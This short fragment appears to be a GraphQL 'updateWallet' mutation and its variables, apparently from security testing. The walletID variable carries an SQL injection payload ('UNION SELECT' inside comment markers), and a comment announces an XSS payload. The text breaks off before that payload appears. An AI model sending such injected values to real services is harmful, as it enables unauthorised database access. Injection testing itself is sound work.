variables = {"walletID": "WALLET_1/** UNION SELECT 1,2,3 /**/", "name": "Jane Doe"}

mutation updateWallet($walletID: ID!, $name: String!) {
  updateWallet(walletID: $walletID, name: $name) {
    wallet {
      # Injecting XSS payload
